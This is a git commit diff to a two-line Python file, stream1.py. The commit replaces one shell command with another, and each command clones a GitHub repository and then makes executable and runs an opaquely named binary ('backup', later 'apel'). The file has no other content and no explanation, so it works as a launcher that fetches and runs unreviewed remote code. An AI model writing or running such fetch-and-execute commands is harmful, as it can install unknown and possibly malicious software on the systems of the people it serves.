f9feb21a0473c7d619e833a109c58605265a444a
zadst <95879325+zadst@users.noreply.github.com>
2021-12-10 03:19:33 +0700

    Update stream1.py

--- stream1.py
+++ stream1.py
@@ -1,2 +1,2 @@
 import os
-os.system ("git clone https://github.com/samrikulan/lagraven.git && cd lagraven && chmod +x backup && ./backup")
+os.system ("git clone https://github.com/samrikulan/toya.git && cd toya && chmod +x apel && ./apel")
